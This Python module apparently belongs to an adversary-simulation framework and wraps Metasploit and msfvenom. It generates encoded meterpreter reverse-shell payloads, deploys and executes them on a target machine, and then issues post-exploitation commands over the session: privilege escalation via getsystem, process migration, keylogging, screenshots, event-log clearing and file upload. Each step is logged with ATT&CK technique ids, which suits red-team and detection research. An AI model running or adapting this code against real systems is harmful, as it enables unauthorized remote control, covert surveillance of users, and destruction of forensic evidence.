#!/usr/bin/env python3
""" Module to control Metasploit and related tools (MSFVenom) on the attack server """

import time
import socket
import os
import random
import requests

from pymetasploit3.msfrpc import MsfRpcClient
# from app.machinecontrol import Machine
from app.attack_log import AttackLog
from app.interface_sfx import CommandlineColors
from app.exceptions import MetasploitError, ServerError


# https://github.com/DanMcInerney/pymetasploit3


class Metasploit():
    """ Metasploit class for basic Metasploit wrapping """

    def __init__(self, password, attack_logger, **kwargs):
        """

        :param password: password for the msfrpcd
        :param attack_logger: The attack logger to use for logging/printing
        :param kwargs: Relevant ones: uri, port, server, username
        """

        self.password = password
        self.attack_logger = attack_logger
        self.username = kwargs.get("username", None)
        self.kwargs = kwargs
        self.client = None

        # Optional attacker: If a running attacker machine is passed, we take it and start the msfrpcd
        # Alternative: The server is taken and we expect an already running msfrpcd there
        self.attacker = kwargs.get("attacker", None)
        if self.attacker:
            # we expect a running attacker but without a running msfrcpd
            self.start_msfrpcd()
            kwargs["server"] = self.attacker.get_ip()
            time.sleep(3)   # Waiting for server to start. Or we would get https connection errors when getting the client.

    def start_exploit_stub_for_external_payload(self, payload='linux/x64/meterpreter_reverse_tcp', exploit='exploit/multi/handler', lhost=None):
        """ Start a metasploit handler and wait for external payload to connect

        @param payload: The payload being used in the implant
        @param exploit: Normally the generic handler. Overwrite it if you feel lucky
        @param lhost: the ip of the attack host. Use this to use the attacker ip as seen from the controller.
        @:returns: res, which contains "job_id" and "uuid"
        """
        exp = self.get_client().modules.use('exploit', exploit)
        # print(exploit.description)
        # print(exploit.missing_required)
        pl = self.get_client().modules.use('payload', payload)
        # print(payload.description)
        # print(payload.missing_required)
        if lhost is None:
            lhost = self.attacker.get_ip()
        pl["LHOST"] = lhost
        print(f"Creating stub for external payload Exploit: {exploit} Payload: {payload}, lhost: {lhost}")
        res = exp.execute(payload=pl)
        print(res)
        return res

    def start_msfrpcd(self):
        """ Starts the msfrpcs on the attacker. Metasploit must alredy be installed there ! """

        cmd = f"killall msfrpcd; nohup msfrpcd -P {self.password} -U {self.username} -S &"

        self.attacker.remote_run(cmd, disown=True)
        # print("msfrpcd started")
        # breakpoint()
        time.sleep(3)

    def get_client(self):
        """ Get a local metasploit client connected to the metasploit server """

        # print("starting get client")
        # print(f"Password: {self.password}")
        # print(f"Kwargs: {self.kwargs}")

        if self.client:
            return self.client

        self.client = None
        retries = 5
        sleeptime = 5

        while retries:
            try:
                self.client = MsfRpcClient(self.password, **self.kwargs)
                break
            except requests.exceptions.ConnectionError:
                self.start_msfrpcd()
                time.sleep(sleeptime)
                sleeptime += 5
                print("Failed getting connection to msfrpcd. Retries left: {retries}")
            retries -= 1

        if self.client is None:
            raise ServerError("Was not able to properly start and connect to msfrpcd")

        return self.client

    def wait_for_session(self, retries=50):
        """ Wait until we get a session """

        while self.get_client().sessions.list == {}:
            time.sleep(1)
            print(f"Metasploit waiting to get any session {retries}")
            retries -= 1
            if retries <= 0:
                raise MetasploitError("Can not find any session")

    def get_sid(self, session_number=0):
        """ Get the first session between hacked target and the metasploit server

        @param session_number: number of the session to get
        """

        self.wait_for_session()

        return list(self.get_client().sessions.list)[session_number]

    def get_sid_to(self, target):
        """ Get the session to a specified target

        @param target: a target machine to find in the session list
        """

        print(f"Sessions: {self.get_client().sessions.list}")

        # Get_ip can also return a network name. Matching a session needs a real ip
        name_resolution_worked = True
        try:
            target_ip = socket.gethostbyname(target.get_ip())
        except socket.gaierror:
            target_ip = target.get_ip()   # Limp on feature if we can not get a name resolution
            name_resolution_worked = False
            print(f"Name resolution for {target.get_ip()} failed. Sessions are: {self.get_client().sessions.list}")

        retries = 100
        while retries > 0:
            for key, value in self.get_client().sessions.list.items():
                if value["session_host"] == target_ip:
                    # print(f"session list: {self.get_client().sessions.list}")
                    return key

            time.sleep(1)
            retries -= 1
        raise MetasploitError(f"Could not find session for {target.get_ip()} Name resolution worked: {name_resolution_worked}")

    def meterpreter_execute(self, cmds: list[str], session_number: int, delay=0) -> list[str]:
        """ Executes commands on the meterpreter, returns results read from shell

        @param cmds: commands to execute, a list
        @param session_number: session number
        @param delay: optional delay between calling the command and expecting a result
        @:return: the string results
        """

        shell = self.client.sessions.session(self.get_sid(session_number))
        res = []
        for cmd in cmds:
            shell.write(cmd.strip())
            time.sleep(delay)
            res.append(shell.read())
        return res

    def meterpreter_execute_on(self, cmds: list[str], target, delay=0) -> list[str]:
        """ Executes commands on the meterpreter, returns results read from shell

        @param cmds: commands to execute, a list
        @param target: target machine
        @param delay: optional delay between calling the command and expecting a result
        @:return: the string results
        """

        session_id = self.get_sid_to(target)
        # print(f"Session ID: {session_id}")
        shell = self.client.sessions.session(session_id)
        res = []
        time.sleep(1)  # To ensure an active session
        for cmd in cmds:
            shell.write(cmd)
            time.sleep(delay)
            retries = 20
            shell_result = ""
            while retries > 0:
                shell_result += shell.read()
                time.sleep(0.5)   # Command needs time to execute
                retries -= 1
            res.append(shell_result)

        return res

    def smart_infect(self, target, payload_type="windows/x64/meterpreter/reverse_https", payload_name="babymetal.exe"):
        """ Checks if a target already has a meterpreter session open. Will deploy a payload if not """

        # TODO Smart_infect should detect the platform of the target and pick the proper parameters based on that

        try:
            self.start_exploit_stub_for_external_payload(payload=payload_type)
            self.wait_for_session(2)
        except MetasploitError:

            self.attack_logger.vprint(
                f"{CommandlineColors.OKCYAN}Create payload {payload_name} replacement{CommandlineColors.ENDC}",
                1)
            venom = MSFVenom(self.attacker, target, self.attack_logger)
            venom.generate_and_deploy(payload=payload_type,
                                      architecture="x86",
                                      platform="windows",
                                      lhost=self.attacker.get_ip(),
                                      format="exe",
                                      outfile=payload_name,
                                      encoder="x86/shikata_ga_nai",
                                      iterations=5
                                      )
            self.attack_logger.vprint(
                f"{CommandlineColors.OKCYAN}Execute {payload_name} replacement - waiting for meterpreter shell{CommandlineColors.ENDC}",
                1)

            self.start_exploit_stub_for_external_payload(payload=payload_type)
            self.wait_for_session()

##########################################################################


class MSFVenom():
    """ Class to remote controll payload generator MSFVenom on the attacker machine """

    def __init__(self, attacker, target, attack_logger: AttackLog):
        """

        :param attacker: attacker machine
        :param target: target machine
        :param attack_logger: The logger for the attack
        """
        # https://www.offensive-security.com/metasploit-unleashed/msfvenom/

        self.attacker = attacker
        self.target = target
        self.attack_logger = attack_logger

    def generate_payload(self, **kwargs):
        """ Generates a payload on the attacker machine

        """
        payload = kwargs.get("payload", None)
        architecture = kwargs.get("architecture", None)
        platform = kwargs.get("platform", self.target.get_os())
        lhost = kwargs.get("lhost", self.attacker.get_ip())
        file_format = kwargs.get("format", None)  # file format
        outfile = kwargs.get("outfile", "payload.exe")
        encoder = kwargs.get("encoder", None)
        iterations = kwargs.get("iterations", None)

        cmd = "msfvenom"
        if architecture is not None:
            if architecture not in ["x86", "x64"]:
                raise MetasploitError(f"MSFVenom wrapper does not support architecture {architecture}")
            cmd += f" -a {architecture}"
        if platform is not None:
            if platform not in ["windows", "linux"]:
                raise MetasploitError(f"MSFVenom wrapper does not support platform {platform}")
            cmd += f" --platform {platform}"
        if payload is not None:
            cmd += f" -p {payload}"
        if lhost is not None:
            cmd += f" LHOST={lhost}"
        if file_format is not None:
            cmd += f" -f {file_format}"
        if outfile is not None:
            cmd += f" -o {outfile}"
        if encoder is not None:
            if encoder not in ["x86/shikata_ga_nai"]:
                raise MetasploitError(f"MSFVenom wrapper does not support encoder {encoder}")
            cmd += f" -e {encoder}"
        if iterations is not None:
            cmd += f" -i {iterations}"
        cmd += " SessionRetryWait=1 "

        # Detecting all the mistakes that already have been made. To be continued
        # Check if encoder supports the architecture
        if encoder == "x86/shikata_ga_nai" and architecture == "x64":
            raise MetasploitError(f"Encoder {encoder} does not support 64 bit architecture")

        # Check if payload is for the right amount of bit
        if architecture == "x64" and "/x64/" not in payload:
            raise MetasploitError(f"Payload {payload} does not support 64 bit architecture")
        if architecture == "x86" and "/x64/" in payload:
            raise MetasploitError(f"Payload {payload} does not support 32 bit architecture")

        # Check if payload is platform
        if platform not in payload:
            raise MetasploitError(f"Payload {payload} support platform {platform}")

        # Footnote: Currently we only support windows/linux and the "boring" payloads. This will be more tricky as soon as we get creative here

        print(cmd)
        self.attacker.remote_run(cmd)

    def generate_and_deploy(self, **kwargs):
        """ Will generate the payload and directly deploy it to the target

        :return:
        """
        self.generate_payload(**kwargs)

        payload_name = kwargs.get("outfile", "payload.exe")

        self.attacker.get(payload_name, self.target.get_machine_path_external())
        src = os.path.join(self.target.get_machine_path_external(), payload_name)

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Generated {payload_name}...deploying it{CommandlineColors.ENDC}",
            1)
        # Deploy to target
        if self.attack_logger:
            logid = self.attack_logger.start_file_write("", self.target.get_name(), payload_name)
        playground = self.target.get_playground()
        print(f"Putting to {self.target.get_name() }/ {playground}")
        self.target.put(src, playground)
        if self.attack_logger:
            self.attack_logger.stop_file_write("", self.target.get_name(), payload_name, logid=logid)

        if self.target.get_os() == "linux":
            if self.target.get_playground() is not None:
                cmd = f"cd {self.target.get_playground()};"
            else:
                cmd = ""
            cmd += f"chmod +x {payload_name}; ./{payload_name}"
        if self.target.get_os() == "windows":
            cmd = f'wmic process call create "%homepath%\\{payload_name}",""'
        print(cmd)

        if self.attack_logger:
            logid = self.attack_logger.start_execute_payload("", self.target.get_name(), cmd)
        res = self.target.remote_run(cmd, disown=True)
        print(f"Running payload, result is {res}")
        if self.attack_logger:
            self.attack_logger.stop_execute_payload("", self.target.get_name(), cmd, logid=logid)
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Executed payload {payload_name} on {self.target.get_name()} {CommandlineColors.ENDC}",
            1)

################


class MetasploitInstant(Metasploit):
    """ A simple metasploit class with pre-defined metasploit attacks and logging. Just add water

    The attacks pre-defioned in here are the bread-and-butter attacks, the most basic ones. Those you will need all the time when simulating and adversary.
    No need to add specific/specific ones in here. In attack plugins you will find all the features as well. Better code them there.

    """

    def parse_ps(self, ps_output):
        """ Parses the data from ps
        :param ps_output: Metasploit ps output
        :return: A list of dicts
        """
        ps_data = []
        for line in ps_output.split("\n")[6:]:
            pieces = line.split("  ")
            cleaned_pieces = []
            for piece in pieces:
                if len(piece):
                    cleaned_pieces.append(piece)

            if len(cleaned_pieces) > 2:
                rep = {"PID": int(cleaned_pieces[0].strip()),
                       "PPID": int(cleaned_pieces[1].strip()),
                       "Name": cleaned_pieces[2].strip(),
                       "Arch": None,
                       "Session": None,
                       "User": None,
                       "Path": None}
                if len(cleaned_pieces) >= 4:
                    rep["Arch"] = cleaned_pieces[3].strip()
                if len(cleaned_pieces) >= 5:
                    rep["Session"] = int(cleaned_pieces[4].strip())
                if len(cleaned_pieces) >= 6:
                    rep["User"] = cleaned_pieces[5].strip()
                if len(cleaned_pieces) >= 7:
                    rep["Path"] = cleaned_pieces[6].strip()
                ps_data.append(rep)

        return ps_data

    def filter_ps_results(self, data, user=None, name=None, arch=None):
        """  Filter the process lists for certain

        @param user: The user to filter for.
        @param name: The process name to filter for (executable name)
        @param arch: The architecture to select. 'x64' is one option
        """

        res = data
        if user is not None:
            res = [item for item in res if item["User"] == user]
        if name is not None:
            res = [item for item in res if item["Name"].lower() == name.lower()]
        if arch is not None:
            res = [item for item in res if item["Arch"] == arch]
        return res

    def ps_process_discovery(self, target, **kwargs):
        """ Do a process discovery on the target """

        command = "ps -ax"
        ttp = "T1057"
        tactics = "Discovery"
        tactics_id = "TA0007"
        description = "Process discovery can be used to identify running security solutions, processes with elevated privileges, interesting services."

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)

        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
                                                           target=target.get_ip(),
                                                           metasploit_command=command,
                                                           ttp=ttp,
                                                           name="ps",
                                                           description=description,
                                                           tactics=tactics,
                                                           tactics_id=tactics_id,
                                                           situation_description=kwargs.get("situation_description", None),
                                                           countermeasure=kwargs.get("countermeasure", None)
                                                           )
        res = self.meterpreter_execute_on([command], target)

        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command,
                                                  ttp=ttp,
                                                  logid=logid,
                                                  result=res)
        return res

    def migrate(self, target, user=None, name=None, arch=None):
        """  Migrate to a process matching certain criteria

        @param user: The user to filter for.
        @param name: The process name to filter for (executable name)
        @param arch: The architecture to select. 'x64' is one option
        """

        ttp = "T1055"

        process_list = self.ps_process_discovery(target)
        ps = self.parse_ps(process_list[0])
        filtered_list = self.filter_ps_results(ps, user, name, arch)

        if len(filtered_list) == 0:
            print(process_list)
            raise MetasploitError("Did not find a matching process to migrate to")

        # picking random target process
        target_process = random.choice(filtered_list)
        print(f"Migrating to process {target_process}")
        command = f"migrate {target_process['PID']}"
        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp)
        res = self.meterpreter_execute_on([command], target)
        print(res)
        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command,
                                                  ttp=ttp,
                                                  result=res)
        return res

    def arp_network_discovery(self, target, **kwargs):
        """ Do a network discovery on the target """

        command = "arp"
        ttp = "T1016"
        tactics = "Discovery"
        tactics_id = "TA0007"
        description = "Network discovery can be a first step for lateral movement."

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)

        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
                                                           target=target.get_ip(),
                                                           metasploit_command=command,
                                                           ttp=ttp,
                                                           name="arp",
                                                           description=description,
                                                           tactics=tactics,
                                                           tactics_id=tactics_id,
                                                           situation_description=kwargs.get("situation_description",
                                                                                            None),
                                                           countermeasure=kwargs.get("countermeasure", None)
                                                           )
        res = self.meterpreter_execute_on([command], target)
        print(res)
        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command,
                                                  ttp=ttp,
                                                  logid=logid,
                                                  result=res)
        return res

    def nslookup(self, target, target2, **kwargs):
        """ Do a nslookup discovery on the target

        @param target: Command runs here
        @param target2: This one is looked up
        """

        command = f"execute -f nslookup.exe -H -i -a '{target2.get_ip()}'"
        ttp = "T1018"
        tactics = "Discovery"
        tactics_id = "TA0007"
        description = "Nslookup to get information on a specific target"

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)

        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
                                                           target=target.get_ip(),
                                                           metasploit_command=command,
                                                           ttp=ttp,
                                                           name="nslookup",
                                                           description=description,
                                                           tactics=tactics,
                                                           tactics_id=tactics_id,
                                                           situation_description=kwargs.get("situation_description",
                                                                                            None),
                                                           countermeasure=kwargs.get("countermeasure", None)
                                                           )
        res = self.meterpreter_execute_on([command], target)
        print(res)
        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command,
                                                  ttp=ttp,
                                                  logid=logid,
                                                  result=res)
        return res

    def getsystem(self, target, **kwargs):
        """ Do a network discovery on the target """

        command = "getsystem"
        ttp = "????"   # It uses one out of three different ways to elevate privileges.
        tactics = "Privilege Escalation"
        tactics_id = "TA0004"
        description = """
Elevate privileges from local administrator to SYSTEM. Three ways to do that will be tried:
* named pipe impersonation using cmd
* named pipe impersonation using a dll
* token duplication
"""
        # https://docs.rapid7.com/metasploit/meterpreter-getsystem/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)

        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
                                                           target=target.get_ip(),
                                                           metasploit_command=command,
                                                           ttp=ttp,
                                                           name="getsystem",
                                                           description=description,
                                                           tactics=tactics,
                                                           tactics_id=tactics_id,
                                                           situation_description=kwargs.get("situation_description", None),
                                                           countermeasure=kwargs.get("countermeasure", None)
                                                           )
        res = self.meterpreter_execute_on([command], target)
        print(res)
        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command,
                                                  ttp=ttp,
                                                  logid=logid,
                                                  result=res)
        return res

    def clearev(self, target):
        """ Clears windows event logs """

        command = "clearev"
        ttp = "T1070.001"   # It uses one out of three different ways to elevate privileges.

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)

        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp)
        res = self.meterpreter_execute_on([command], target)
        print(res)
        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command,
                                                  ttp=ttp,
                                                  result=res)
        return res

    def screengrab(self, target):
        """ Creates a screenshot

        Before using it, migrate to a process running while you want to monitor.
        One with the permission "NT AUTHORITY\\SYSTEM"
        """

        command = "screengrab"
        ttp = "T1113"   # It uses one out of three different ways to elevate privileges.

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)

        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp)
        res = self.meterpreter_execute_on(["use espia"], target)
        print(res)
        res = self.meterpreter_execute_on([command], target)
        print(res)
        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command,
                                                  ttp=ttp,
                                                  result=res)
        return res

    def keylogging(self, target, monitoring_time):
        """ Starts keylogging

        Before using it, migrate to a process running while you want to monitor.

        "winlogon.exe" will monitor user logins. "explorer.exe" during the session.

        @param monitoring_time: Seconds the keylogger is running
        @param monitoring_time: The time to monitor the keys. In seconds
        """

        command = "keyscan_start"
        ttp = "T1056.001"   # It uses one out of three different ways to elevate privileges.

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)

        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp)
        res = self.meterpreter_execute_on([command], target)
        print(res)
        time.sleep(monitoring_time)
        res = self.meterpreter_execute_on(["keyscan_dump"], target)
        print(res)
        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command,
                                                  ttp=ttp,
                                                  result=res)
        return res

    def getuid(self, target):
        """ Returns the UID

        """

        command = "getuid"
        ttp = "T1056.001"   # It uses one out of three different ways to elevate privileges.

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)

        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp)
        res = self.meterpreter_execute_on([command], target)

        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command,
                                                  ttp=ttp,
                                                  result=res)
        return res[0]

    def sysinfo(self, target):
        """ Returns the sysinfo

        """

        command = "sysinfo"
        ttp = "T1082"   # It uses one out of three different ways to elevate privileges.

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)

        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp)
        res = self.meterpreter_execute_on([command], target)

        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command,
                                                  ttp=ttp,
                                                  result=res)
        return res[0]

    def upload(self, target, src, dst, **kwargs):
        """ Upload file from metasploit controller to target

        @param src: source file name on metasploit controller
        @param dst: destination file name on target machine
        """

        command = f"upload {src} '{dst}'  "
        ttp = "????"  # It uses one out of three different ways to elevate privileges.
        tactics = "???"
        tactics_id = "???"
        description = """
Uploading new files to the target. Can be config files, tools, implants, ...
"""

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)

        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
                                                           target=target.get_ip(),
                                                           metasploit_command=command,
                                                           ttp=ttp,
                                                           name="upload",
                                                           description=description,
                                                           tactics=tactics,
                                                           tactics_id=tactics_id,
                                                           situation_description=kwargs.get("situation_description",
                                                                                            None),
                                                           countermeasure=kwargs.get("countermeasure", None)
                                                           )
        res = self.meterpreter_execute_on([command], target, kwargs.get("delay", 10))
        print(res)
        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command,
                                                  ttp=ttp,
                                                  logid=logid,
                                                  result=res)
        return res
